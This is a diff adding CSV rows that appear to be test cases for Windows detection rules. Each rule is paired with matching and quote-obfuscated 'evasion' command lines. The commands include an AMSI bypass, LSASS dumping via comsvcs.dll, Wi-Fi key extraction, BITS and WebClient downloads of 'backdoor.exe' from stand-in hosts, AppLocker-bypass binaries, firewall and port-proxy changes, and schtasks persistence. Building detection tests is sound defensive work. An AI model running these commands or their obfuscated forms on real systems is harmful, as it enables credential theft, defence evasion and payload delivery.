+win_netsh_allow_port_rdp,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,netsh.exe advf fi add rule acti=allow protoc=TCP localp=3389 dir=in name=RDP
+win_netsh_allow_port_rdp,Microsoft-Windows-Sysmon_1_Match_01.json,netsh advfirewall firewall add rule action=allow protocol=TCP localport=3389 dir=in name=allowRDP
+win_netsh_allow_port_rdp,Microsoft-Windows-Sysmon_1_Match_03.json,netsh.exe advfirewall firewall add rule action=allow protocol=TCP localport=3389 dir=in name=RDP
+win_netsh_allow_port_rdp,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,netsh advfirewall   firewall   add   rule action=allow protocol=TCP localport=3389 dir=in name=allowRDP
+win_netsh_allow_port_rdp,Microsoft-Windows-Sysmon_1_Match_02.json,netsh advfirewall firewall add rule action=allow protocol=TCP localport=3389 dir=in name=rlnm
+win_netsh_fw_add,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,netsh advfirewall firewall    add rule action=allow protocol=UDP localport=1337 dir=in name=rulename
+win_netsh_fw_add,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"n""ets""h.exe advfirewall fi""rewa""ll   a""d""d rule action=allow protocol=TCP localport=4242 dir=in name=nicerule"
+win_netsh_fw_add,Microsoft-Windows-Sysmon_1_Match_01.json,netsh advfirewall firewall add rule action=allow protocol=TCP localport=4711 dir=in name=mfwrl
+win_netsh_fw_add,Microsoft-Windows-Sysmon_1_Match_03.json,netsh.exe advfirewall firewall add rule action=allow protocol=TCP localport=4242 dir=in name=nicerule
+win_netsh_fw_add,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"n""et""sh advfirewall fire""""wall a""d""d rule action=allow protocol=TCP localport=4711 dir=in name=mfwrl"
+win_netsh_fw_add,Microsoft-Windows-Sysmon_1_Match_02.json,netsh advfirewall firewall add rule action=allow protocol=UDP localport=1337 dir=in name=rulename
+win_netsh_packet_capture,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,netsh t s c=y
+win_netsh_packet_capture,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"n""""e""ts""h t s cap=yes"
+win_netsh_packet_capture,Microsoft-Windows-Sysmon_1_Match_01.json,netsh.exe trace start capture=yes
+win_netsh_packet_capture,Microsoft-Windows-Sysmon_1_Match_03.json,netsh trace start cap=yes
+win_netsh_packet_capture,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"n""ets""h.exe t""""ra""c""e st""ar""t capture=yes"
+win_netsh_packet_capture,Microsoft-Windows-Sysmon_1_Match_02.json,netsh trace start capture=yes
+win_netsh_port_fwd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"n""et""sh inter""""face po""rtpr""oxy a""d""d v4""to""v4 listenport=1337 connectaddress=127.0.0.1 connectport=2448"
+win_netsh_port_fwd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,netsh i p a v listenport=4242 connectaddress=127.0.0.1 connectport=4343
+win_netsh_port_fwd,Microsoft-Windows-Sysmon_1_Match_01.json,netsh interface portproxy add v4tov4 listenport=4711 connectaddress=127.0.0.1 connectport=4712
+win_netsh_port_fwd,Microsoft-Windows-Sysmon_1_Match_03.json,netsh interface portproxy add v4tov4 listenport=4242 connectaddress=127.0.0.1 connectport=4343
+win_netsh_port_fwd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,netsh.exe    interface     portproxy     add      v4tov4 listenport=4711 connectaddress=127.0.0.1 connectport=4712
+win_netsh_port_fwd,Microsoft-Windows-Sysmon_1_Match_02.json,netsh interface portproxy add v4tov4 listenport=1337 connectaddress=127.0.0.1 connectport=2448
+win_netsh_port_fwd_3389,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"ne""ts""h interface portproxy add listenport=3""38""9 connectaddress=127.0.0.1 connectport=3390"
+win_netsh_port_fwd_3389,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,netsh interface portproxy add connectaddress=127.0.0.1 connectport=4711 listenport=3389
+win_netsh_port_fwd_3389,Microsoft-Windows-Sysmon_1_Match_01.json,netsh interface portproxy add listenport=3389 c=127.0.0.1 connectp=33389
+win_netsh_port_fwd_3389,Microsoft-Windows-Sysmon_1_Match_03.json,netsh interface portproxy add listenport=3389 connectaddress=127.0.0.1 connectport=4711
+win_netsh_port_fwd_3389,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,netsh.exe    interface portproxy add listenport=3389 c=127.0.0.1 connectp=33389
+win_netsh_port_fwd_3389,Microsoft-Windows-Sysmon_1_Match_02.json,netsh interface portproxy add listenport=3389 connectaddress=127.0.0.1 connectport=3390
+win_netsh_wifi_credential_harvesting,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"net""sh"" ""w""lan show profile name=WLAN-XYZ432 key=""clear"""
+win_netsh_wifi_credential_harvesting,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"net""sh""   w""la""n    show  profile name=WLAN-0B1W4N key  =   c""le""ar"
+win_netsh_wifi_credential_harvesting,Microsoft-Windows-Sysmon_1_Match_01.json,netsh wlan show profile name=WLAN-1A2B3C key=clear
+win_netsh_wifi_credential_harvesting,Microsoft-Windows-Sysmon_1_Match_03.json,netsh wlan show profile name=WLAN-0B1W4N key=clear
+win_netsh_wifi_credential_harvesting,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,netsh    wlan    show profile name=WLAN-1A2B3C key  =   clear    
+win_netsh_wifi_credential_harvesting,Microsoft-Windows-Sysmon_1_Match_02.json,netsh wlan show profile name=WLAN-XYZ432 key=clear
+win_network_sniffing,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"tshark -""i"" Ethernet"
+win_network_sniffing,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Program Files\Wireshark\tshark.exe --""inter""face ""Local Area Connection* 7"""
+win_network_sniffing,Microsoft-Windows-Sysmon_1_Match_01.json,tshark.exe -i Ethernet
+win_network_sniffing,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Program Files\Wireshark\tshark.exe --interface ""Local Area Connection* 7"""
+win_network_sniffing,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"tshark.exe -""i"" Ethernet"
+win_network_sniffing,Microsoft-Windows-Sysmon_1_Match_02.json,tshark -i Ethernet
+win_new_service_creation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"sc.exe create niceservice b""""in""Pa""th=C:\Path\To\Binary.exe"
+win_new_service_creation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -c ""New""-s""erv""ic""""e MyPsService C:\Destination\some.exe"
+win_new_service_creation,Microsoft-Windows-Sysmon_1_Match_01.json,sc.exe create mynewservice binPath=C:\Path\To\Binary.exe
+win_new_service_creation,Microsoft-Windows-Sysmon_1_Match_03.json,powershell -c New-Service MyPsService C:\Destination\some.exe
+win_new_service_creation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"sc.exe c""re""a""""te mynewservice binPath=C:\Path\To\Binary.exe"
+win_new_service_creation,Microsoft-Windows-Sysmon_1_Match_02.json,sc.exe create niceservice binPath=C:\Path\To\Binary.exe
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"Install""Ut""il.exe /logfile= /LogToConsole=false /U AllTheThings.dll"
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\reg""sv""cs.exe AllTheThingsx64.dll"
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\i""eexe""c.exe http://x.x.x.x:8080/bypass.exe"
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"C:\Windows\Microsoft.NET\Framework\v2.0.50727\re""gasm"".exe /U AllTheThingsx64.dll"
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Windows\System32\msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\regsvcs.exe AllTheThingsx64.dll
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"m""sd""t.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE"
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Match_04.json,C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThingsx64.dll
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Match_06.json,C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe http://x.x.x.x:8080/bypass.exe
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbu""ild"".exe project.csproj"
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+win_possible_applocker_bypass,Microsoft-Windows-Sysmon_1_Match_05.json,C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbuild.exe project.csproj
+win_powershell_amsi_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsi""Init""Failed','NonPublic,Static').SetValue($null,$true)"
+win_powershell_amsi_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -C [Ref].Assembly.GetType('http://Sys""""tem.Mana""gem""ent.Automation.AmsiUtils').GetField('ams""iI""nitFailed','NonPublic,Static').SetValue($null,$true)"
+win_powershell_amsi_bypass,Microsoft-Windows-Sysmon_1_Match_01.json,"powershell -C [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+win_powershell_amsi_bypass,Microsoft-Windows-Sysmon_1_Match_03.json,"powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+win_powershell_amsi_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -C [Ref].Assembly.GetType('""Sys""tem.""Management"".""Auto""mation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+win_powershell_amsi_bypass,Microsoft-Windows-Sysmon_1_Match_02.json,"powershell -C [Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+win_powershell_bitsjob,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell.exe -Command St""""art-B""its""Trans""f""er -Source http://another.remote/backdoor.exe -Destination C:\Temp\thisisfine.exe"
+win_powershell_bitsjob,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell.exe -Command Start-B""i""tsTransfer -Source http://my.host/custom.dll -Destination C:\Temp\nice.dll"
+win_powershell_bitsjob,Microsoft-Windows-Sysmon_1_Match_01.json,powershell.exe -Command Start-BitsTransfer -Source http://remote.host/mal.exe -Destination C:\Temp\notmal.exe
+win_powershell_bitsjob,Microsoft-Windows-Sysmon_1_Match_03.json,powershell.exe -Command Start-BitsTransfer -Source http://my.host/custom.dll -Destination C:\Temp\nice.dll
+win_powershell_bitsjob,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell.exe -Command S""tar""t-Bi""t""s""""Tra""ns""fer -Source http://remote.host/mal.exe -Destination C:\Temp\notmal.exe"
+win_powershell_bitsjob,Microsoft-Windows-Sysmon_1_Match_02.json,powershell.exe -Command Start-BitsTransfer -Source http://another.remote/backdoor.exe -Destination C:\Temp\thisisfine.exe
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -ve""rs""io 2 -Command Get-Date"
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell ""-versi""   2 -Command Get-Host"
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,powershell -ve   2 -Command Get-Host
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,powershell -v 2 -Command Get-Date
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Match_01.json,powershell -version 2 -Command Get-Host
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Match_03.json,powershell -versi 2 -Command Get-Host
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,powershell -version   2 -Command Get-Host
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Match_04.json,powershell -vers 2 -Command Get-Date
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Match_06.json,powershell -ve 2 -Command Get-Host
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"powershell -""ver""   2 -Command Get-Host"
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Match_02.json,powershell -version 2 -Command Get-Date
+win_powershell_downgrade_attack,Microsoft-Windows-Sysmon_1_Match_05.json,powershell -ver 2 -Command Get-Host
+win_powershell_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell.exe -C (N""e""w-Object     System.""Net"".Web""cli""ent).""Download""File(remote.url/malicious.txt, output.txt)"
+win_powershell_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell.exe -C (New-""Object""     Net.Webclient).Down""loadS""tring(server.org/my.file)"
+win_powershell_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"powershell.exe -C (New-Ob""je""ct    Net.We""bcl""ient).D""own""loa""dF""ile(somewhere.com/some.exe, output.exe)"
+win_powershell_download,Microsoft-Windows-Sysmon_1_Match_01.json,powershell.exe -C (New-Object System.Net.Webclient).DownloadString(remote.url/malicious.txt)
+win_powershell_download,Microsoft-Windows-Sysmon_1_Match_03.json,powershell.exe -C (New-Object Net.Webclient).DownloadString(server.org/my.file)
+win_powershell_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell.exe -C (New-O""bj""ect     S""yst""em.""Net"".W""eb""client).""Down""load""String""(remote.url/malicious.txt)"
+win_powershell_download,Microsoft-Windows-Sysmon_1_Match_04.json,"powershell.exe -C (New-Object Net.Webclient).DownloadFile(somewhere.com/some.exe, output.exe)"
+win_powershell_download,Microsoft-Windows-Sysmon_1_Match_02.json,"powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt, output.txt)"
+win_powershell_frombase64string,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::F""rom""Base64""String""('Y21k')))"
+win_powershell_frombase64string,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::From""Base""64""St""ring('Y21k')))"
+win_powershell_frombase64string,Microsoft-Windows-Sysmon_1_Match_01.json,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABF')))
+win_powershell_frombase64string,Microsoft-Windows-Sysmon_1_Match_03.json,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y21k')))
+win_powershell_frombase64string,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::Fr""omBa""se""64""String('JABF')))"
+win_powershell_frombase64string,Microsoft-Windows-Sysmon_1_Match_02.json,powershell.exe -C [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y21k')))
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell ""/NoProf"" ipconfig"
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,powershell.exe /nonint Get-Date
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,powershell.exe -enc aQBwAGMAbwBuAGYAaQBnAA==
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Match_01.json,powershell.exe -windowstyle h notepad.exe
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Match_03.json,powershell.exe -nonint Get-Date
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell.exe ""/windowstyle"" 1 notepad.exe"
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Match_04.json,powershell.exe -ec aQBwAGMAbwBuAGYAaQBnAA==
+win_powershell_suspicious_parameter_variation,Microsoft-Windows-Sysmon_1_Match_02.json,powershell -NoProf ipconfig
+win_powershell_xor_commandline,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -C -j""oi""n('a', 'b')"
+win_powershell_xor_commandline,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -C [c""ha""r]4711"
+win_powershell_xor_commandline,Microsoft-Windows-Sysmon_1_Match_01.json,powershell -C 3 -bxor 1
+win_powershell_xor_commandline,Microsoft-Windows-Sysmon_1_Match_03.json,powershell -C [char]4711
+win_powershell_xor_commandline,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -C 3 -b""xo""r 1"
+win_powershell_xor_commandline,Microsoft-Windows-Sysmon_1_Match_02.json,"powershell -C -join('a', 'b')"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\system32\schtasks.exe"" /create /sc daily /tr powershell.exe /tn goodupdater"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\system32\schtasks.exe"" -create /tn updatertask -sc onidle /tr powershell.exe"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\Windows\system32\schtasks.exe"" /create -sc updater /tn updatertask -tr powershell.exe"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\system32\schtasks.exe"" /create /sc onlogon /tn myupdater /tr powershell.exe"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\system32\schtasks.exe"" /create /sc onidle /tn updatertask /tr powershell.exe"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\system32\schtasks.exe"" -create -sc onlogon -tn myupdater -tr powershell.exe"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Match_04.json,"""C:\Windows\system32\schtasks.exe"" /create /sc updater /tn updatertask /tr powershell.exe"
+win_powersploit_empire_schtasks,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\Windows\system32\schtasks.exe"" /create /sc daily /tn goodupdater /tr powershell.exe"
+win_process_creation_bitsadmin_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmd /c copy   ""bit""sad""min.e""xe C:\Destination\bitsadmin.exe"
+win_process_creation_bitsadmin_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,cmd /c copy System32\bitsadmin.exe C:\Destination\bitsadmin.exe
+win_process_creation_bitsadmin_download,Microsoft-Windows-Sysmon_1_Match_01.json,bitsadmin /transfer jobname http://domain/file C:\file
+win_process_creation_bitsadmin_download,Microsoft-Windows-Sysmon_1_Match_03.json,cmd /c copy bitsadmin.exe C:\Destination\bitsadmin.exe
+win_process_creation_bitsadmin_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"bitsadmin ""/transfer"" jobname http://domain/file C:\file"
+win_process_creation_bitsadmin_download,Microsoft-Windows-Sysmon_1_Match_02.json,cmd /c copy bitsadmin.exe C:\Destination\bitsadmin.exe
+win_process_dump_rundll32_comsvcs,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"rundll32.exe ""comsvcs.dll"",#24 654 lsass.dmp full"
+win_process_dump_rundll32_comsvcs,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"rundll32.exe ""comsvcs.dll"", Minidump 136 my.dmp full"
+win_process_dump_rundll32_comsvcs,Microsoft-Windows-Sysmon_1_Match_01.json,"rundll32.exe comsvcs.dll,Minidump 600 dumpfile.dmp full"
+win_process_dump_rundll32_comsvcs,Microsoft-Windows-Sysmon_1_Match_03.json,"rundll32.exe comsvcs.dll,Minidump 136 my.dmp full"
+win_process_dump_rundll32_comsvcs,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"rundll32.exe comsvcs.dll,   Minidump 600 dumpfile.dmp full"
+win_process_dump_rundll32_comsvcs,Microsoft-Windows-Sysmon_1_Match_02.json,"rundll32.exe comsvcs.dll,#24 654 lsass.dmp full"
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"reg s""av""e HKLM\Software\Microsoft\Windows\CurrentVer""""sion\RunSer""vic""esOnce C:\Temp\regsave.txt"
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_09.json,reg export HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run explexp.reg
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"reg e""xp""ort HKLM\Software\Microsoft\Windows\Cur""rent""Version\Run""""Services myexport.reg"
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"reg exp""or""t HKLM\Software\Microsoft\Windows\CurrentVersion\R""un""Once exp.reg"
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Win""log""on\Notify"""
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,"reg q""u""ery HKLM\system\curren""tcon""tro""""lset\ser""vic""es"
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_01.json,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"""
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_03.json,reg export HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices myexport.reg
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"reg q""""u""e""ry ""HKLM\SOFTWARE\Microsoft\Windows NT\Current""Ver""sion\Win""do""ws"""
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Ru""nOnceE""x"
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_04.json,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"""
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"reg save HKLM\Software\Microsoft\Windows\CurrentVersion\R""""un save_cv_run.reg"
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_06.json,reg export HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce exp.reg
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"reg s""av""e HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell""Service""ObjectDelayLoad ssodl.reg"
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_07.json,reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_02.json,reg save HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce C:\Temp\regsave.txt
+win_query_registry,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"reg ex""""port HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\R""""un explexp.reg"
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_08.json,reg save HKLM\Software\Microsoft\Windows\CurrentVersion\Run save_cv_run.reg
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_05.json,reg save  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad ssodl.reg
+win_query_registry,Microsoft-Windows-Sysmon_1_Match_10.json,reg query HKLM\system\currentcontrolset\services
+win_redmimicry_winnti_proc,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmd /c C:\Wi""nd""ows\T""""emp\t""m""p.b""a""t"
+win_redmimicry_winnti_proc,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmd /c C:\\Wi""nd""ows\\\T""em""p\\t""""mp.bat"
+win_redmimicry_winnti_proc,Microsoft-Windows-Sysmon_1_Match_01.json,cmd /c C:\Windows\Temp\tmp.bat
+win_redmimicry_winnti_proc,Microsoft-Windows-Sysmon_1_Match_03.json,cmd /c C:\Windows\Temp\tmp.bat
+win_redmimicry_winnti_proc,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,cmd /c C:\\Windows\\\Temp\\tmp.bat
+win_redmimicry_winnti_proc,Microsoft-Windows-Sysmon_1_Match_02.json,cmd /c C:\Windows\Temp\tmp.bat
+win_remote_time_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"w32tm -""t""z"
+win_remote_time_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell /c Get-Da""t""e"
+win_remote_time_discovery,Microsoft-Windows-Sysmon_1_Match_01.json,net time \hostname
+win_remote_time_discovery,Microsoft-Windows-Sysmon_1_Match_03.json,powershell /c Get-Date
+win_remote_time_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net ""ti""me \hostname"
+win_remote_time_discovery,Microsoft-Windows-Sysmon_1_Match_02.json,w32tm -tz
+win_run_powershell_script_from_ads,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Get-Content C:\BREACH\userbehavior.log -Str""""eam ''"""
+win_run_powershell_script_from_ads,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""G""""et-C""""on""""tent C:\BREACH\userbe""""havio""""r.log -S""""tr""""eam ''"""
+win_run_powershell_script_from_ads,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Get-Content C:\BREACH\userbehavior.log -Stream ''"""
+win_run_powershell_script_from_ads,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C ""Get-Content baz.txt -Stream ''"""
+win_run_powershell_script_from_ads,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Get-Con""""tent C:\BREACH\userbehavior.log -Stream ''"""
+win_run_powershell_script_from_ads,Microsoft-Windows-Sysmon_1_Match_02.json,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c ""Get-Content -Stream '' d:\foo.bar"""
+win_service_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"net ""start"" ""windows audio"""
+win_service_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\net1 ""start"" ""windows audio"""
+win_service_execution,Microsoft-Windows-Sysmon_1_Match_01.json,"C:\Windows\System32\net1 start ""windows audio"""
+win_service_execution,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Windows\system32\net1.exe START  ""windows search"""
+win_service_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Windows\System32\net.exe ""start"" foo"
+win_service_execution,Microsoft-Windows-Sysmon_1_Match_02.json,"net  start ""windows search"""
+win_shadow_copies_access_symlink,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmd /c ""m""k""l""i""n""k /D c:\foobar \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\"""
+win_shadow_copies_access_symlink,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\cmd.exe"" /c ""mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\Harddisk""Volume""Shadow""Copy""1\"""
+win_shadow_copies_access_symlink,Microsoft-Windows-Sysmon_1_Match_01.json,"cmd /c ""mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"""
+win_shadow_copies_access_symlink,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\System32\cmd.exe"" /c ""mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"""
+win_shadow_copies_access_symlink,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmd /c ""mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\Harddisk""""VolumeShadowCopy1\"""
+win_shadow_copies_access_symlink,Microsoft-Windows-Sysmon_1_Match_02.json,"cmd /c ""mklink /D c:\foobar \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\"""
+win_spn_enum,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\set_spn.exe -""Q"" */*server*"
